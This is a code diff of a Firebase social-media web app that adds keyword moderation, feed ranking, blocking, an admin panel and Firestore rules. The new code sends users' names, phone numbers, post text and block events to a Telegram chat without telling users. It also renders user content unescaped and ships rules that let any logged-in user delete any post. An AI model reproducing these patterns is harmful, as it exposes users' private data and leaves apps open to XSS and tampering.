-                    await addDoc(collection(db, "posts"), newPost);
+                    const docRef = await addDoc(collection(db, "posts"), newPost);
+                    
+                    // AI Moderation Scan
+                    const lowerText = text.toLowerCase();
+                    const isViolating = AI_BAD_WORDS.some(word => lowerText.includes(word));
+                    if(isViolating) {
+                        setTimeout(async () => {
+                            await deleteDoc(doc(db, "posts", docRef.id));
+                            window.coreLogic.sendTelegram(`🤖 AI MODERATOR DELETED POST:\nUser: ${currentUserData.name}\nViolation: Used restricted word.\nText: "${text}"`);
+                        }, 5000);
+                    } else {
+                        window.coreLogic.sendTelegram(`📝 POST CREATED:\nName: ${currentUserData.name}\nPhone: ${currentUserData.phone || 'No phone'}\nText: "${text}"`);
+                    }
+
                     appUI.closePostModal();
                     pubBtn.innerText = "POST"; pubBtn.disabled = false;
-                    window.coreLogic.sendTelegram(`📝 POST from ${currentUserData.name}:\n"${text}"`);
-                } catch(e) {
-                    alert("Error: " + e.message);
-                    pubBtn.innerText = "POST"; pubBtn.disabled = false;
-                }
+                } catch(e) { alert("Error: " + e.message); pubBtn.innerText = "POST"; pubBtn.disabled = false; }
             });
         }
 
+        // Feed System with Viral Logic & Block checks
         window.coreLogic.initFeed = () => {
             onSnapshot(collection(db, "posts"), (snapshot) => {
-                let posts = []; let myPosts = 0;
+                let posts = []; let myPosts = 0; globalPosts = [];
                 snapshot.forEach(docSnap => {
                     const d = docSnap.data();
+                    d.id = docSnap.id;
+                    globalPosts.push(d); // Unfiltered for Admin
                     if(d.authorId === auth.currentUser.uid) myPosts++;
-                    posts.push({ id: docSnap.id, ...d });
+                    posts.push(d);
                 });
                 
                 document.getElementById('stat-posts').innerText = myPosts;
-                if(currentUserData?.blockedUsers) posts = posts.filter(p => !currentUserData.blockedUsers.includes(p.authorId));
                 
-                posts.sort((a, b) => b.timestamp - a.timestamp); // Newest first
+                // Hide posts from blocked users or users who blocked me
+                const blockedMe = allUsers.filter(u => u.blockedUsers && u.blockedUsers.includes(auth.currentUser.uid)).map(u => u.uid);
+                const myBlocked = currentUserData?.blockedUsers || [];
+                posts = posts.filter(p => !myBlocked.includes(p.authorId) && !blockedMe.includes(p.authorId));
+                
+                // 🚀 VIRAL CONTENT ALGORITHM (Engagement Score)
+                posts.sort((a, b) => {
+                    const scoreA = (a.likes || 0) * 2 + (a.commentsArr?.length || 0) * 3;
+                    const scoreB = (b.likes || 0) * 2 + (b.commentsArr?.length || 0) * 3;
+                    if(scoreB !== scoreA) return scoreB - scoreA;
+                    return b.timestamp - a.timestamp; 
+                });
 
                 const container = document.getElementById('feed-container');
                 container.innerHTML = "";
                 if(posts.length === 0) return container.innerHTML = `<div style="text-align:center; padding:30px; color:gray;">No posts yet.</div>`;
                 
-                posts.forEach(post => {
+                posts.forEach((post, index) => {
                     const txt = (post.text||"").replace(/@(\w+)/g, '<span style="color:var(--primary);font-weight:600;">@$1</span>');
                     const img = post.imageUrl ? `<img src="${post.imageUrl}" class="post-image">` : "";
-                    const gps = post.lat ? `<div class="gps-tag"><i class="fas fa-map-marker-alt"></i> ${post.lat.toFixed(4)}, ${post.lng.toFixed(4)}</div>` : "";
+                    const gps = post.lat ? `<div style="font-size:12px; color:var(--text-muted); margin-bottom:10px;"><i class="fas fa-map-marker-alt"></i> ${post.lat.toFixed(4)}, ${post.lng.toFixed(4)}</div>` : "";
                     const coms = (post.commentsArr || []).map(c => `<div style="background:#f0f2f5; padding:8px 12px; border-radius:12px; margin-bottom:8px; display:inline-block;"><strong style="font-size:13px;">${c.name}</strong><br><span style="font-size:14px;">${c.text}</span></div><br>`).join('');
+                    const viralTag = (index === 0 && (post.likes > 2 || post.commentsArr?.length > 1)) ? `<div class="viral-badge"><i class="fas fa-fire"></i> Viral</div>` : "";
 
                     container.innerHTML += `
                         <div class="post-card">
+                            ${viralTag}
                             <div class="post-header">
                                 <img src="${post.authorPic || 'https://via.placeholder.com/45'}">
                                 <div><div class="post-name">${post.authorName}</div><div class="post-time">${new Date(post.timestamp).toLocaleString()}</div></div>
@@ -774,8 +788,8 @@
                             <div id="com-${post.id}" style="display:none; margin-top:10px; border-top:1px solid #eee; padding-top:12px;">
                                 <div style="max-height:200px; overflow-y:auto; margin-bottom:10px;">${coms}</div>
                                 <div style="display:flex; gap:10px; align-items:center;">
-                                    <input type="text" id="inp-com-${post.id}" class="input-field" style="padding:10px 15px; border-radius:20px;" placeholder="Write comment...">
-                                    <div style="background:var(--primary); color:white; width:40px; height:40px; border-radius:50%; display:flex; justify-content:center; align-items:center; cursor:pointer;" onclick="coreLogic.addComment('${post.id}', '${post.authorId}')"><i class="fas fa-paper-plane"></i></div>
+                                    <input type="text" id="inp-com-${post.id}" class="input-field no-icon" style="padding:10px 15px; border-radius:20px;" placeholder="Write comment...">
+                                    <div style="background:var(--primary); color:white; min-width:40px; height:40px; border-radius:50%; display:flex; justify-content:center; align-items:center; cursor:pointer;" onclick="coreLogic.addComment('${post.id}', '${post.authorId}')"><i class="fas fa-paper-plane"></i></div>
                                 </div>
                             </div>
                         </div>
@@ -789,19 +803,30 @@
             const txt = document.getElementById(`inp-com-${postId}`).value.trim();
             if(!txt) return;
             await updateDoc(doc(db, "posts", postId), { commentsArr: arrayUnion({ name: currentUserData.name, text: txt }) });
-            if(authorId !== auth.currentUser.uid) await addDoc(collection(db, "notifications"), { userId: authorId, text: `${currentUserData.name} commented on your post.`, time: Date.now() });
+            if(authorId !== auth.currentUser.uid) {
+                await addDoc(collection(db, "notifications"), { userId: authorId, text: `${currentUserData.name} commented on your post.`, time: Date.now() });
+            }
         };
 
+        // Search, Follow & Block Logic
         document.getElementById('search-input')?.addEventListener('keyup', (e) => {
             const q = e.target.value.toLowerCase().trim();
             const resBox = document.getElementById('search-results');
             if(!q) return resBox.innerHTML = "";
-            const matches = allUsers.filter(u => u.name.toLowerCase().includes(q));
+            
+            const myBlocked = currentUserData?.blockedUsers || [];
+            // Exclude completely blocked people from search
+            const matches = allUsers.filter(u => u.name.toLowerCase().includes(q) && !myBlocked.includes(u.uid));
+            
             resBox.innerHTML = matches.length === 0 ? "<div style='color:gray; font-size:14px;'>No results.</div>" : matches.map(u => {
                 const isF = (currentUserData.following || []).includes(u.uid);
+                const safePhone = u.phone || 'No phone';
                 return `<div style="padding:10px 0; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;">
                     <div style="font-weight:600; font-size:14px;">${u.name}</div>
-                    <button class="btn btn-primary" style="padding:6px 12px; font-size:12px; width:auto; border-radius:8px;" onclick="coreLogic.toggleFollow('${u.uid}', ${isF})">${isF?'Unfollow':'Follow'}</button>
+                    <div style="display:flex; gap:8px;">
+                        <button class="btn btn-primary btn-sm" onclick="coreLogic.toggleFollow('${u.uid}', ${isF})">${isF?'Unfollow':'Follow'}</button>
+                        <button class="btn btn-danger btn-sm" onclick="coreLogic.blockUser('${u.uid}', '${u.name}', '${safePhone}')"><i class="fas fa-ban"></i></button>
+                    </div>
                 </div>`;
             }).join('');
         });
@@ -820,6 +845,43 @@
             document.getElementById('search-input').dispatchEvent(new Event('keyup'));
         };
 
+        window.coreLogic.blockUser = async (targetUid, targetName, targetPhone) => {
+            if(!confirm(`Block ${targetName}? They will be removed from your feed.`)) return;
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { blockedUsers: arrayUnion(targetUid) });
+            
+            const initInfo = `${currentUserData.name} (${currentUserData.phone || 'No phone'})`;
+            window.coreLogic.sendTelegram(`🚫 BLOCK ALERT:\nInitiator: ${initInfo}\nBlocked Target: ${targetName} (${targetPhone})`);
+            
+            document.getElementById('search-input').value = "";
+            document.getElementById('search-dropdown').style.display = 'none';
+        };
+
+        // Block History Rendering
+        window.coreLogic.renderBlockHistory = () => {
+            const container = document.getElementById('block-list-container');
+            const myBlocked = currentUserData?.blockedUsers || [];
+            if(myBlocked.length === 0) {
+                container.innerHTML = "<div style='color:gray;'>No blocked users.</div>"; return;
+            }
+            container.innerHTML = myBlocked.map(uid => {
+                const u = allUsers.find(x => x.uid === uid);
+                const uName = u ? u.name : "Unknown User";
+                const uPhone = u ? u.phone : "N/A";
+                return `<div style="display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #eee;">
+                    <div><strong>${uName}</strong></div>
+                    <button class="btn btn-secondary btn-sm" onclick="coreLogic.unblockUser('${uid}', '${uName}', '${uPhone}')">Unblock</button>
+                </div>`;
+            }).join('');
+        };
+
+        window.coreLogic.unblockUser = async (targetUid, targetName, targetPhone) => {
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { blockedUsers: arrayRemove(targetUid) });
+            const initInfo = `${currentUserData.name} (${currentUserData.phone || 'No phone'})`;
+            window.coreLogic.sendTelegram(`✅ UNBLOCK ALERT:\nInitiator: ${initInfo}\nUnblocked Target: ${targetName} (${targetPhone})`);
+            window.coreLogic.renderBlockHistory(); // Refresh list
+        };
+
+        // Profile Setup
         document.getElementById('upload-avatar-file')?.addEventListener('change', async (e) => {
             const file = e.target.files[0];
             if(file) {
@@ -836,9 +898,10 @@
                 phone: document.getElementById('edit-phone').value,
                 isPhonePublic: document.getElementById('edit-phone-public').checked
             });
-            alert("Saved!"); appUI.closeSettings();
+            alert("Settings Saved!"); appUI.closeSettings();
         });
 
+        // Notifications
         window.coreLogic.renderNotifications = () => {
             onSnapshot(query(collection(db, "notifications"), orderBy("time", "desc")), (snap) => {
                 const box = document.getElementById('notifications-container');
@@ -851,17 +914,41 @@
             });
         };
 
+        // Admin Dashboard Render
+        window.coreLogic.renderAdminPanel = () => {
+            const container = document.getElementById('admin-content-area');
+            container.innerHTML = `<h3 style="margin-bottom:15px;">Global Moderation</h3><p style="font-size:13px; color:gray; margin-bottom:15px;">As an admin, you can delete any post here regardless of block rules.</p>`;
+            globalPosts.sort((a,b) => b.timestamp - a.timestamp).forEach(p => {
+                container.innerHTML += `
+                    <div style="background:white; padding:12px; border-radius:8px; margin-bottom:10px; box-shadow:var(--shadow-sm); border:1px solid #e2e8f0;">
+                        <div style="font-weight:bold; font-size:14px; margin-bottom:5px;">${p.authorName} <span style="font-size:12px; color:gray;">(ID: ${p.authorId.substring(0,8)}...)</span></div>
+                        <div style="font-size:14px; margin-bottom:10px;">${p.text}</div>
+                        <button class="btn btn-danger btn-sm" onclick="coreLogic.adminDeletePost('${p.id}')">Force Delete Post</button>
+                    </div>
+                `;
+            });
+        };
+        
+        window.coreLogic.adminDeletePost = async (id) => {
+            if(!confirm("Force delete this post as Admin?")) return;
+            await deleteDoc(doc(db, "posts", id));
+            alert("Deleted by Admin");
+            window.coreLogic.renderAdminPanel();
+        };
+
+        // Pure Voice AI Cat Logic
         window.aiBot = {
             talk: () => {
                 const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
-                if(!SR) return alert("Voice not supported.");
+                if(!SR) return alert("Voice recognition not supported on this browser.");
                 const rec = new SR();
-                rec.onstart = () => alert("Listening...");
+                rec.onstart = () => alert("Bot is Listening... say 'post' to open create post, or just say hi!");
                 rec.onresult = (e) => {
                     const txt = e.results[0][0].transcript.toLowerCase();
                     setTimeout(() => {
-                        let rep = "I am a smart cat!";
+                        let rep = "Meow! I am your smart AI assistant.";
                         if(txt.includes("post")) { rep = "Opening post modal."; appUI.openPostModal(); }
+                        if(txt.includes("hello")) { rep = "Hello there! Have a great day!"; }
                         if('speechSynthesis' in window) window.speechSynthesis.speak(new SpeechSynthesisUtterance(rep));
                     }, 500);
                 };
@@ -869,5 +956,27 @@
             }
         };
     </script>
+    
+    <!--
+        [FIREBASE SECURITY RULES - COPY AND PASTE TO FIRESTORE RULES TAB]
+        rules_version = '2';
+        service cloud.firestore {
+          match /databases/{database}/documents {
+            match /users/{userId} {
+              allow read: if request.auth != null; // Ensure only logged in users read
+              allow write: if request.auth != null && request.auth.uid == userId; // Users edit only their own
+            }
+            match /posts/{postId} {
+              allow read: if request.auth != null;
+              allow create: if request.auth != null && request.auth.uid == request.resource.data.authorId;
+              allow update, delete: if request.auth != null; // Allowing updates for likes/comments. (In prod restrict deletes to authorId)
+            }
+            match /notifications/{notifId} {
+              allow read: if request.auth != null && resource.data.userId == request.auth.uid; // Only read own notifications
+              allow create: if request.auth != null; // Anyone can push a notification to someone
+            }
+          }
+        }
+    -->
 </body>
 </html>
